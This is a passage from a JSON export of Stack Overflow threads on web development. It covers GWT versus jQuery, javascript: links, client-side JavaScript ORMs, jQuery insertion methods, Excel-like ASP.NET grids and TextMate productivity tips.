                    "body": "<p>All the great tips and no one spoke about JSNI! A feature in GWT that allows you to use javascript if you wish. </p>\n\n<p><a href=\"https://developers.google.com/web-toolkit/doc/latest/DevGuideCodingBasicsJSNI\" rel=\"nofollow\">https://developers.google.com/web-toolkit/doc/latest/DevGuideCodingBasicsJSNI</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>The answer is not easy. The answer is \"it depends\":</p>\n\n<p>GWT:</p>\n\n<ul>\n<li>if you know and like Java</li>\n<li>if your server code is also written in Java, writing client code in Java makes it possible to use the same code on client and server</li>\n<li>if you like things provided by strongly-typed languages: compile-time type checking, automated refactoring, automated code generation (Ctrl+1 in Eclipse), code completion (Ctrl+Space)</li>\n<li>if you like component-oriented programming (eg MenuBar creates a menu)</li>\n<li>if complexity of GWT (compared to jQuery) is not problem for you</li>\n<li>if big generated code is not a problem for you</li>\n</ul>\n\n<p>jQuery:</p>\n\n<ul>\n<li>if you know and like JavaScript</li>\n<li>you don't need to use the same code on client and server (eg. client - JS, server - Java or PHP)</li>\n<li>if you don't need compile-time type checking, automated refactoring, etc</li>\n<li>if you don't need component-oriented programming (to create a complex component in jQuery you need to create a series of divs, and call $(\"those divs\").makeXXXXControl())</li>\n<li>if you like simplicity (jQuery is simpler than GWT)</li>\n<li>if you need very small code (eg to make website loading faster)</li>\n</ul>\n\n<p>Personally I would recommend GWT for most projects, but jQuery also has pros and some people may prefer jQuery.</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>GWT is a compiler (Java to JavaScript) and jQuery is a framework. You don't have to choose one over the other. You can use one of them, both or neither.</p>\n\n<p>For instance you can code in Java if you want to or have existing source code and then use jQuery for other stuff. There are available wrappers, but GWT can call JavaScript (and vice versa) see <a href=\"http://svenbuschbeck.net/wordpress/2012/06/how-to-use-jquery-in-gwt/\" rel=\"nofollow\">http://svenbuschbeck.net/wordpress/2012/06/how-to-use-jquery-in-gwt/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I need to decide between jQuery and GWT for my new project.</p>\n\n<p>I haven't programmed in JavaScript for a while, and I was looking into GWT for the last few days.  It looks pretty awesome, generating all the different JS for different browsers and all, however:</p>\n\n<ul>\n<li>developing in Java takes more time than the same thing using jQuery (at least for this project)</li>\n<li>the documentation is poor (for example, how should I know which elements should I use when designing the page? -- there's not enough documentation for this)</li>\n</ul>\n\n<p>I've been using jQuery for most of my projects and it's pretty good.</p>\n\n<p><strong>I want to convince the client that jQuery is better suited for this project and I need more arguments to support this.</strong></p>\n",
            "last_activity_date": 1404805707,
            "question_id": 1205278,
            "score": 72,
            "tags": [
                "javascript",
                "jquery",
                "gwt"
            ],
            "title": "Why should I use jQuery instead of GWT?"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>It is a way of making a link do absolutely nothing when clicked (unless Javascript events are bound to it).</p>\n\n<p>It is a way of running Javascript instead of following a link:</p>\n\n<pre><code>&lt;a href=\"Javascript: doStuff();\"&gt;link&lt;/a&gt;\n</code></pre>\n\n<p>When there isn't actually javascript to run (like your example) it does nothing.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<pre><code>&lt;a href=\"javascript:void(0);\"&gt;&lt;/a&gt;\n</code></pre>\n\n<p><code>javascript:</code> tells the browser going to write javascript code</p>\n",
                    "is_accepted": false,
                    "score": -2
                },
                {
                    "body": "<pre><code>&lt;a href=\"javascript:alert('Hello');\"&gt;&lt;/a&gt;\n</code></pre>\n\n<p>is just shorthand for:</p>\n\n<pre><code>&lt;a href=\"\" onclick=\"alert('Hello'); return false;\"&gt;&lt;/a&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>basically instead of using the link to move pages (or anchors), using this method launches a javascript function(s)</p>\n\n<pre><code>&lt;script&gt;\nfunction doSomething() {\n  alert(\"hello\")\n}\n&lt;/script&gt;\n&lt;a href=\"javascript:doSomething();\"&gt;click me&lt;/a&gt;\n</code></pre>\n\n<p>clicking the link will fire the alert.</p>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>An <code>&lt;a&gt;</code> element is invalid HTML unless it has either an <code>href</code> or <code>name</code> attribute.</p>\n\n<p>If you want it to render correctly as a link (ie underlined, hand pointer, etc), then it will only do so if it has a <code>href</code> attribute.</p>\n\n<p>Code like this is therefore sometimes used as a way of making a link, but without having to provide an actual URL in the <code>href</code> attribute. The developer obviously wanted the link itself not to do anything, and this was the easiest way he knew.</p>\n\n<p>He probably has some javascript event code elsewhere which is triggered when the link is clicked, and that will be what he wants to actually happen, but he wants it to look like a normal <code>&lt;a&gt;</code> tag link.</p>\n\n<p>Some developers use <code>href='#'</code> for the same purpose, but this causes the browser to jump to the top of the page, which may not be wanted. And he couldn't simply leave the href blank, because <code>href=''</code> is a link back to the current page (ie it causes a page refresh).</p>\n\n<p>There are ways around these things. Using an empty bit of Javascript code in the <code>href</code> is one of them, and although it isn't the best solution, it does work.</p>\n",
                    "is_accepted": true,
                    "score": 64
                },
                {
                    "body": "<p>There are several mechanisms to avoid a link to reach its destination. The one from the question is not much intuitive.</p>\n\n<p>A cleaner option is to use <code>href=\"#no\"</code> where <code>#no</code> is a non-defined anchor in the document.</p>\n\n<p>You can use a more semantic name such as #disable, or #action to increase readability. </p>\n\n<p><strong>Benefits of the approach:</strong></p>\n\n<ul>\n<li>Avoids the \"moving to the top\" effect of the empty href=\"#\"</li>\n<li>Avoids the use of javascript</li>\n</ul>\n\n<p><strong>Drawbacks:</strong></p>\n\n<ul>\n<li>You must be sure the anchor name is not used in the document. </li>\n</ul>\n\n<p>Since the <code>&lt;a&gt;</code> element is not acting as a link, the best option in these cases is not using an <code>&lt;a&gt;</code> element but a <code>&lt;div&gt;</code> and provide the desired link-like style.</p>\n",
                    "is_accepted": false,
                    "score": 16
                },
                {
                    "body": "<p>Refer to this: </p>\n\n<pre><code>&lt;a href=\"Http://WWW.stackoverflow.com\"&gt;Link to the website opened in different tab&lt;/a&gt;\n&lt;a href=\"#MyDive\"&gt;Link to the div in the page(look at the chaneged url)&lt;/a&gt;\n&lt;a href=\"javascript:;\"&gt;Nothing happens if there is no javaScript to render&lt;/a&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have seen the following href used in webpages from time to time.  However, I don't understand what this is trying to do or the technique.  Can someone elaborate please?</p>\n\n<pre><code>&lt;a href=\"javascript:;\"&gt;&lt;/a&gt;\n</code></pre>\n",
            "last_activity_date": 1413177960,
            "question_id": 7755088,
            "score": 59,
            "tags": [
                "javascript"
            ],
            "title": "What does href expression &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; do?"
        },
        {
            "answer_count": 0,
            "body": "<h2>There are multiple JavaScript ORMs available</h2>\n\n<p><strong>Active</strong></p>\n\n<p>Data.js: <a href=\"http://datajs.codeplex.com/documentation\">http://datajs.codeplex.com/documentation</a> - Data querying library</p>\n\n<p>JayData: <a href=\"http://jaydata.org/\">http://jaydata.org/</a> - Is active, data modeling, querying, caching</p>\n\n<p>Breeze.js: <a href=\"http://www.breezejs.com/\">http://www.breezejs.com/</a> - Is active, data modeling, querying, caching</p>\n\n<p>persistance: <a href=\"http://zef.me/2774/persistence-js-an-asynchronous-javascript-orm-for-html5gears\">http://zef.me/2774/persistence-js-an-asynchronous-javascript-orm-for-html5gears</a> - Async, browser and client-side support</p>\n\n<p><strong>Inactive</strong> </p>\n\n<p>JazzRecord: <a href=\"http://www.jazzrecord.org/\">http://www.jazzrecord.org/</a> - Ruby centric, inactive since 2011</p>\n\n<p>Impel: <a href=\"http://impel.simulacre.org/\">http://impel.simulacre.org/</a> - Does not appear to be active in 2 years</p>\n\n<p>Active.js <a href=\"http://www.activejs.org/\">http://www.activejs.org/</a> - Does not appear to be active in 3 years</p>\n\n<p>Upshot.js: <a href=\"https://nuget.org/packages/Upshot\">https://nuget.org/packages/Upshot</a> - No longer actively supported</p>\n\n<p>Aptana: <a href=\"http://blog.fedecarg.com/2009/02/16/activerecord-javascript-orm/\">http://blog.fedecarg.com/2009/02/16/activerecord-javascript-orm/</a> - Rails, website doesn't show activity as an ORM</p>\n\n<p><strong>Then there are ORMs which belong to a specific MVC framework.</strong></p>\n\n<p>Sproutcore: <a href=\"http://www.sproutcore.com/\">http://www.sproutcore.com/</a></p>\n\n<p>Backbone: <a href=\"http://backbonejs.org/\">http://backbonejs.org/</a></p>\n\n<p>Spine: <a href=\"http://maccman.github.com/spine/\">http://maccman.github.com/spine/</a></p>\n\n<p>Ember Data: <a href=\"https://github.com/emberjs/data\">https://github.com/emberjs/data</a></p>\n\n<p>ngResource: <a href=\"http://docs.angularjs.org/api/ngResource.%24resource\">http://docs.angularjs.org/api/ngResource.$resource</a></p>\n\n<p><strike>Which one of these would you recommend on basis of features, ease of use, support and active development.</strike></p>\n",
            "last_activity_date": 1376570133,
            "question_id": 6786307,
            "score": 48,
            "tags": [
                "javascript",
                "html5",
                "orm",
                "breeze",
                "jaydata"
            ],
            "title": "What options are available for client-side JavaScript ORM?"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<p><code>append()</code> &amp; <code>prepend()</code> are for inserting content inside an element (making the content its child) while <code>after()</code> &amp; <code>before()</code> insert content outside an element (making the content its sibling).</p>\n",
                    "is_accepted": false,
                    "score": 18
                },
                {
                    "body": "<h2>See :</h2>\n\n<hr>\n\n<p><code>.append()</code> puts data inside an element at <code>last index</code> and<br>\n<code>.prepend()</code> puts the prepending elem at <code>first index</code></p>\n\n<hr>\n\n<h2>suppose:</h2>\n\n<pre><code>&lt;div class='a'&gt; //&lt;---you want div c to append in this\n  &lt;div class='b'&gt;b&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<h2>when <code>.append()</code> executes it will look like this:</h2>\n\n<pre><code>$('.a').append($('.c'));\n</code></pre>\n\n<p>after execution:</p>\n\n<pre><code>&lt;div class='a'&gt; //&lt;---you want div c to append in this\n  &lt;div class='b'&gt;b&lt;/div&gt;\n  &lt;div class='c'&gt;c&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<hr>\n\n<h3><a href=\"http://jsfiddle.net/hB2E4/4/\">Fiddle with .append() in execution.</a></h3>\n\n<hr>\n\n<h2>when <code>.prepend()</code> executes it will look like this:</h2>\n\n<pre><code>$('.a').prepend($('.c'));\n</code></pre>\n\n<p>after execution:</p>\n\n<pre><code>&lt;div class='a'&gt; //&lt;---you want div c to append in this\n  &lt;div class='c'&gt;c&lt;/div&gt;\n  &lt;div class='b'&gt;b&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<hr>\n\n<h3><a href=\"http://jsfiddle.net/hB2E4/5/\">Fiddle with .prepend() in execution.</a></h3>\n\n<hr>\n\n<p><code>.after()</code> puts the element after the element<br>\n<code>.before()</code> puts the element before the element</p>\n\n<hr>\n\n<h2>using after:</h2>\n\n<pre><code>$('.a').after($('.c'));\n</code></pre>\n\n<p>after execution:</p>\n\n<pre><code>&lt;div class='a'&gt;\n  &lt;div class='b'&gt;b&lt;/div&gt;\n&lt;/div&gt;\n&lt;div class='c'&gt;c&lt;/div&gt; //&lt;----this will be placed here\n</code></pre>\n\n<hr>\n\n<h3><a href=\"http://jsfiddle.net/hB2E4/2/\">Fiddle with .after() in execution.</a></h3>\n\n<hr>\n\n<h2>using before:</h2>\n\n<pre><code>$('.a').before($('.c'));\n</code></pre>\n\n<p>after execution:</p>\n\n<pre><code>&lt;div class='c'&gt;c&lt;/div&gt; //&lt;----this will be placed here\n&lt;div class='a'&gt;\n  &lt;div class='b'&gt;b&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<hr>\n\n<h3><a href=\"http://jsfiddle.net/hB2E4/3/\">Fiddle with .before() in execution.</a></h3>\n\n<hr>\n",
                    "is_accepted": true,
                    "score": 121
                },
                {
                    "body": "<p>The best way is going to documentation.</p>\n\n<h2><code>.append()</code> vs <code>.after()</code></h2>\n\n<ul>\n<li>.<a href=\"http://api.jquery.com/append/\"><code>append()</code></a>:  Insert content, specified by the parameter, <strong>to the end</strong> of each element in the set of matched elements.</li>\n<li>.<a href=\"http://api.jquery.com/after/\"><code>after()</code></a>:  Insert content, specified by the parameter, <strong>after</strong> each element in the set of matched elements.</li>\n</ul>\n\n<h2><code>.prepend()</code> vs <code>.before()</code></h2>\n\n<ul>\n<li><a href=\"http://api.jquery.com/prepend/\"><code>prepend()</code></a>: Insert content, specified by the parameter, <strong>to the beginning</strong> of each element in the set of matched elements.</li>\n<li>.<a href=\"http://api.jquery.com/before/\"><code>before()</code></a>: nsert content, specified by the parameter, <strong>before</strong> each element in the set of matched elements.</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>There is a basic difference between <code>.append()</code> and <code>.after()</code> and <code>.prepend()</code> and <code>.before()</code>.</p>\n\n<p><code>.append()</code> adds the parameter element <em>inside the selector element's tag at the very end</em> whereas the <code>.after()</code> adds the parameter element <em>after the element's tag</em>. </p>\n\n<p>The vice-versa is for <code>.prepend()</code> and <code>.before()</code>. </p>\n\n<p><a href=\"http://jsfiddle.net/2RYkg/1/\" rel=\"nofollow\">Fiddle</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>There is no extra advantage for each of them. It totally depends on your scenario. Code below shows their difference.</p>\n\n<pre><code>    Before inserts your html here\n&lt;div id=\"mainTabsDiv\"&gt;\n    Prepend inserts your html here\n    &lt;div id=\"homeTabDiv\"&gt;\n        &lt;span&gt;\n            Home\n        &lt;/span&gt;\n    &lt;/div&gt;\n    &lt;div id=\"aboutUsTabDiv\"&gt;\n        &lt;span&gt;\n            About Us\n        &lt;/span&gt;\n    &lt;/div&gt;\n    &lt;div id=\"contactUsTabDiv\"&gt;\n        &lt;span&gt;\n            Contact Us\n        &lt;/span&gt;\n    &lt;/div&gt;\n    Append inserts your html here\n&lt;/div&gt;\nAfter inserts your html here\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Imagine the <strong>DOM</strong> (HTML page) as a tree right. The HTML elements are the nodes of this tree.</p>\n\n<p>The <code>append()</code> adds a new node to the <code>child</code> of the node you called it on. </p>\n\n<pre><code>Example:$(\"#mydiv\").append(\"&lt;p&gt;Hello there&lt;/p&gt;\") \n\ncreates a child node &lt;p&gt; to &lt;div&gt;\n</code></pre>\n\n<p>The <code>after()</code> adds a new node as a sibling or at the same level or child to the parent of the node you called it on. </p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<h2>To try and answer your <em>main</em> question:</h2>\n\n<h3><strong>why</strong> would you use .append() rather then .after() or vice verses?</h3>\n\n<p>When you are manipulating the DOM with jquery the methods you use depend on the result you want and a frequent use is to replace content.</p>\n\n<p>In replacing content you want to <code>.remove()</code> the content and replace it with new content.  If you <code>.remove()</code> the existing tag and then try to use <code>.append()</code> it won't work because the tag itself has been removed, whereas if you use <code>.after()</code>, the new content if added 'outside' the tag and isn't affected by the previous <code>.remove()</code>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>// &lt;-- $(\".root\").before(\"&lt;div&gt;&lt;/div&gt;\");\n&lt;div class=\"root\"&gt;\n  // &lt;-- $(\".root\").prepend(\"&lt;div&gt;&lt;/div&gt;\");\n  &lt;div&gt;&lt;/div&gt;\n  // &lt;-- $(\".root\").append(\"&lt;div&gt;&lt;/div&gt;\");\n&lt;/div&gt;\n// &lt;-- $(\".root\").after(\"&lt;div&gt;&lt;/div&gt;\");\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This image displayed below gives a clear understanding and shows the exact difference between <code>.append()</code>, <code>.prepend()</code>, <code>.after()</code> and <code>.before()</code></p>\n\n<p><img src=\"http://i.stack.imgur.com/GWmap.png\" alt=\"jQuery infographic\"></p>\n\n<p>You can see from the image that <code>.append()</code> and <code>.prepend()</code> adds the new elements as <strong>child</strong> elements <em>(brown colored)</em> to the  target.</p>\n\n<p>And <code>.after()</code> and <code>.before()</code> adds the new elements as <strong>sibling</strong> elements <em>(black colored)</em> to the  target.</p>\n\n<p>Here is a <strong><a href=\"http://jsfiddle.net/k4raa2gh/1/\">DEMO</a></strong> for better understanding.</p>\n",
                    "is_accepted": false,
                    "score": 8
                }
            ],
            "body": "<p>I am pretty proficient with coding, but now and then I come across code that seems to do basically the same thing. My main question here is, why would you use <code>.append()</code> rather then <code>.after()</code> or vice verses? </p>\n\n<p>I have been looking and cannot seem to find a clear definition of the differences between the two and when to use them and when not to.</p>\n\n<p>What are the benefits of one over the other and also why would i use one rather then the other?? Can someone please explain this to me?</p>\n\n<pre><code>var txt = $('#' + id + ' span:first').html();\n$('#' + id + ' a.append').live('click', function (e) {\n    e.preventDefault();\n    $('#' + id + ' .innerDiv').append(txt);\n});\n$('#' + id + ' a.prepend').live('click', function (e) {\n    e.preventDefault();\n    $('#' + id + ' .innerDiv').prepend(txt);\n});\n$('#' + id + ' a.after').live('click', function (e) {\n    e.preventDefault();\n    $('#' + id + ' .innerDiv').after(txt);\n});\n$('#' + id + ' a.before').live('click', function (e) {\n    e.preventDefault();\n    $('#' + id + ' .innerDiv').before(txt);\n});\n</code></pre>\n",
            "last_activity_date": 1419166679,
            "question_id": 14846506,
            "score": 42,
            "tags": [
                "javascript",
                "jquery",
                "tags",
                "append",
                "prepend"
            ],
            "title": ".append(), prepend(), .after() and .before()"
        },
        {
            "answer_count": 12,
            "answers": [
                {
                    "body": "<p>It does not exist today. There are products such as those you have mentioned which have tried, but in my experience none of them will make an experienced Excel user happy.</p>\n\n<p>My company makes Excel compatible spreadsheet components for use with Windows Forms and ASP.NET. We have been getting this question for years, so we have of course considered building one because it looks like a good business. But HTML / JavaScript is just not a suitable platform for building something which \"feels right\" to users who want it to work like Excel - IMO.</p>\n\n<p>We have settled on the idea of building a spreadsheet control for Silverlight. I believe this will give you the best of both worlds - cross platform rich interactive spreadsheet in the browser which any Excel user would be comfortable with. Unfortunately, that is not going to happen this month or next...</p>\n\n<p>At my previous company, we actually built a spreadsheet component as a Netscape Plugin, as an ActiveX control and as a Java Applet. They had a little bit of success, but none of these technologies ever became ubiquitous in the enterprise for various reasons. I believe Microsoft is finally getting it right with Silverlight and that Silverlight will become the gold standard for browser based Line of Business applications in the Enterprise.</p>\n\n<p>EDIT:</p>\n\n<p>I should have mentioned that the product I alluded to above is Formula One / NET (Netscape Plugin released ~1995), Formula One / ActiveX and Formula One for Java - which is now sold by Actuate as e.Spreadsheet. I left in 2002, but AFAIK they still maintain the Java Applet which is probably the best example of an Excel like UI in the browser (I have no interest in the product any more - in fact we compete to some extent with e.Spreadsheet and intend to have a better answer with a Silverlight control in the future). I did not mention it by name in my original answer because it is a Java product - not a .NET product - but it is a potential answer even for an ASP.NET web site.</p>\n\n<p>Lloyd Cotten correctly comments that Google Docs is an example of a spreadsheet built with HTML / JavaScript. Lloyd says Google Docs \"definitely 'feels right' in its similarity to Excel\". While I respect Lloyd's opinion, in my experience Google Docs does not 'feel right'. Perhaps this is because I'm a spreadsheet guy. I do know that we talk to potential customers almost every day who are trying to solve the problem of the OP, and they have all looked and cannot find one they are happy with - but of course they would not be calling us if they had so we are dealing with a biased sample and I understand that.</p>\n\n<p>So I just want to clarify that there are in fact plenty of examples of HTML / JavaScript grids and spreadsheets which are usable. It's just that I don't want to have to use them because I expect certain keys to do certain things and a particular level of responsiveness which is just not there today with any of the HTML / JavaScript solutions I have tried (and I look at them regularly because my company could definitely sell such a product if it were feasible to build one that we could be proud of).</p>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<p><a href=\"http://blogs.msdn.com/mattdotson/articles/490868.aspx\" rel=\"nofollow\">RealWorld Grid</a> is probably what you are looking for. I'm using it in my projects, and it works perfectly.</p>\n\n<p>Here's their <a href=\"http://www.codeplex.com/ASPNetRealWorldContr\" rel=\"nofollow\">CooglePlex page</a></p>\n\n<p>I don't think it supports the arrow keys, but it makes multirow editing a breeze.</p>\n\n<p>p.s. seems like you're looking for client-side grids ... this one is server-side. I'll leave the comment there, somebody might find it useful.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I have used the Infragistics grid with success. However, the learning curve is huge (and there's practically no support) and I don't know if there is multi-line editing.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I've used <a href=\"http://samples.syncfusion.com/ASPNET/7.1.0.21/Web/Grid.grouping.web/samples/3.5/CRUDOperations/ExcelLikeEdit/CS/ExcelLikeEdit.aspx\" rel=\"nofollow\">Syncfusion's</a> components and they're quite good, they boast an \"Excel-like\" editor, though I didn't see multi-line mentioned.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Well.. not sure, but I am looking for something similar and I found:</p>\n\n<p><a href=\"http://www.nitobi.com/products/completeui/demos/explorer/index.html\" rel=\"nofollow\">Nitobi</a></p>\n\n<p>Not sure if it does exactly what you want, although youcan definately move around with cursor keys, and edit inline....</p>\n\n<p>EDIT\nAlso Essential Objects have a good editor too... seems very like excel...\n<a href=\"http://demo.essentialobjects.com/Default.aspx?path=Grid_i1_i20\" rel=\"nofollow\">http://demo.essentialobjects.com/Default.aspx?path=Grid_i1_i20</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>We ended up using <a href=\"http://www.sigmawidgets.com/\" rel=\"nofollow\">Sigma Grid</a> ... thanks for all the other replies!</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>For intranet and IE users Office Web components can be an option. While flying in the face of all things a good web application should be, they let users feel at home in office on the web.</p>\n\n<p>I had great success using the pivot table control combined with MS OLAP a few years ago.  User loved it and no wheels needed to be reinvented.  </p>\n\n<p><a href=\"http://www.microsoft.com/downloads/details.aspx?FamilyID=982B0359-0A86-4FB2-A7EE-5F3A499515DD&amp;displaylang=EN\" rel=\"nofollow\">http://www.microsoft.com/downloads/details.aspx?FamilyID=982B0359-0A86-4FB2-A7EE-5F3A499515DD&amp;displaylang=EN</a></p>\n\n<p><a href=\"http://msdn.microsoft.com/en-us/magazine/cc164070.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/magazine/cc164070.aspx</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Some time ago when I worked on a project for my previous company I found a project in the Telerik code library section about how to have their grid always editable as an Excel sheet. I am linking it here for your reference:</p>\n\n<p><a href=\"http://www.telerik.com/community/code-library/aspnet-ajax/grid/excel-like-radgrid.aspx\" rel=\"nofollow\">http://www.telerik.com/community/code-library/aspnet-ajax/grid/excel-like-radgrid.aspx</a></p>\n\n<p>Dick</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>How about <a href=\"http://www.fpoint.com/netproducts/spreadweb/spread.aspx\" rel=\"nofollow\">FarPoint Spread</a>?\nI'm in the middle on evaluating FarPoint Spread for ASP.NET, and so far I've been happy with the result.  </p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p><a href=\"http://www.aspboy.com/Categories/GridArticles/Excel_Like_GridView.aspx\" rel=\"nofollow\">http://www.aspboy.com/Categories/GridArticles/Excel_Like_GridView.aspx</a> allows for multiline editing and navigating using the arrow keys, as well as resizing columns and rows.</p>\n\n<p><a href=\"http://darkroastjava.wordpress.com/2010/04/28/creating-an-excel-like-grid-for-asp-net/\" rel=\"nofollow\">http://darkroastjava.wordpress.com/2010/04/28/creating-an-excel-like-grid-for-asp-net/</a> is an extension of that which also supports pasting multi-cell values from the clipboard.</p>\n\n<p>Unfortunately, both only work in IE so far, but that meets my personal needs at this point of time.</p>\n\n<p><em>Update: Please note, the first of these two links seems dead now, it's been replaced by a \u00e7\u00a7#$! commercial page.</em></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I think <a href=\"http://codethat.com/grid/\" rel=\"nofollow\">http://codethat.com/grid/</a> is quite good!</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><a href=\"http://dhtmlx.com/docs/products/dhtmlxGrid/index.shtml\" rel=\"nofollow\">dhtmlxGrid</a> (client-side, JavaScript grid) supports multiline feature (<a href=\"http://dhtmlx.com/docs/products/dhtmlxGrid/samples/16_rows_columns_manipulations/03_grid_multiline_col.html\" rel=\"nofollow\">demo</a>), keyboard navigation and comes with server-side connector for ASP.NET. In case, someone is still looking for such a grid. Disclosure: I'm a part of the DHTMLX team.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>We are looking for an ASP.NET compatible data grid that allows for multi-line editing similar to Excel or a WinForms data grid.  It must also support very basic keyboard input (tab, arrow keys, return).  Note that we are <strong>not</strong> looking for Excel capabilities (functions, formatting, formulas) ... just a grid for fast data entry.</p>\n\n<p>I've looked at Telerik, Infragistics, ComponentOne, DevExpress, and many others ... all their support teams have said that the controls either do not support multi-line, or do so in such a clunky way that it would be unusable.  </p>\n\n<p>Has anyone used any Excel-like grids that they can recommend?  The client-side grids seemed closer to what we needed, with Sigma Widgets ( <a href=\"http://www.sigmawidgets.com/products/sigma%5Fgrid2/demos/example%5Fcolumn%5Feditor.html\">example</a> ) being the closest I've found so far.  Extjs's grid was too inflexible, and the jQuery grid was too buggy.  </p>\n",
            "last_activity_date": 1396699848,
            "question_id": 587120,
            "score": 38,
            "tags": [
                "asp.net",
                "javascript",
                "grid"
            ],
            "title": "Good ASP.NET excel-like Grid control?"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<p>I was on the same boat some time ago. My biggest advice would be to reserve some time to learning your tool. It will do wonders to your productivy. </p>\n\n<p>I started installing the GetBundles bundle:</p>\n\n<pre><code>  cd ~/Library/Application\\ Support/TextMate/Bundles\n  svn co http://svn.textmate.org/trunk/Review/Bundles/GetBundles.tmbundle/\n</code></pre>\n\n<p>With it, you can check and find new bundles. Be sure to go through most of the options of each one you install.</p>\n\n<p>Next, try learning some Textmate skills. I'd recommend the <a href=\"http://peepcode.com/products/textmate-for-rails-2\">Peepcode screencast</a>. It covers Rails related productivy tips and information, and will give you some new ways to develop. </p>\n\n<p>Then, you try reading most Textmate tips you can find on the Internet. There are a few I read from time to time: <a href=\"http://textmatetips.com/\">Textmate Tips</a>, <a href=\"http://domhay.com/blog/2009/10-cool-textmate-tips\">Cool Textmate Tips</a>, <a href=\"http://blog.macromates.com/2007/textmate-tips/\">Textmate Tips from Macromates</a>, <a href=\"http://www.mactips.org/archives/category/textmate-tips/\">Mactips</a>, <a href=\"http://www.456bereastreet.com/archive/200811/textmate%5Fproductivity%5Ftips/\">Textmate Productivity Tips</a>.</p>\n\n<p>There is a Textmate book, but haven't been able to get into it yet. Should be useful, though.</p>\n\n<p>Lastly, the best way to improve your skills is to practice. I try to come up with small week-length projects to use new tips or to remember features I had forgotten.</p>\n\n<p>Good luck :) </p>\n",
                    "is_accepted": true,
                    "score": 19
                },
                {
                    "body": "<p>I've been using TextMate for a while now, and one of the best things about the application is the ability to extend it using bundles. As Yaraher said, there are lots of resources out there, and you should go and take a look.</p>\n\n<p>My only other piece of advice is this: when you find yourself doing something with TextMate over and over, and it is a pain, or you think that it could really do with this or that feature, think about how you could do that with your favourite scripting language. If you can write a script for your feature, you can add it as a command that TextMate can use - have a look at the bundle editor (Ctrl+Opt+Cmd+B) and the existing commands, it is pretty straightforward.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p><strong>Ctrl-Cmd-T</strong> allows you to search for commands, so every time I want to do something new (like a validation macro) I hit <strong>Ctrl-Cmd-T</strong>, type <code>vpo</code> and it finds the correct macro for <code>validate_presence_of</code>, and even tells me to just type <strong>v-p-TAB</strong> next time. It's quite the education.</p>\n\n<p>Also, I managed to use text mate for a year without realising that <strong>Esc</strong> auto completed. Don't miss that one.</p>\n\n<p><strong>Ctrl+Opt+Cmd+V</strong> to see your clipboard history is also a life saver.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Probably the most useful TextMate trick I've found out about is <strong>Cmd-T</strong>, which shows a quick open dialog for the files in a project.</p>\n\n<p>Another good trick I've learned is opening a TextMate project from Terminal (assuming you installed the TextMate Terminal Usage [via the Help menu]). <strong>mate .</strong> from the Terminal will open a TextMate project from the current directory.</p>\n\n<p>If you watch Railscasts, you'll see how useful the various text completion and other Bundle options are. I'd second Yaraher in checking out all the stuff in the Rails bundle (<strong>Cmd+Opt+Ctrl+B</strong>).</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I can recommend looking at these (Note: PDFs):</p>\n\n<p><a href=\"http://pragmaticstudio.com/rails\" rel=\"nofollow\">http://pragmaticstudio.com/rails (Rails TextMate Cheat Sheet)</a></p>\n\n<p><a href=\"http://www.g-design.net/textmate.pdf\" rel=\"nofollow\">http://www.g-design.net/textmate.pdf (HTML/CSS/Javascript/Other TextMate Cheat Sheet)</a></p>\n\n<p>It would also be beneficial to look at the bundle editor (Cmd+Opt+Ctrl+B) and just look around at how the general bundles are setup.  I did that, then shortly after started making little snippets in my own bundle to expedite things which I do most often.</p>\n\n<p>Hope this helps, and good luck!</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
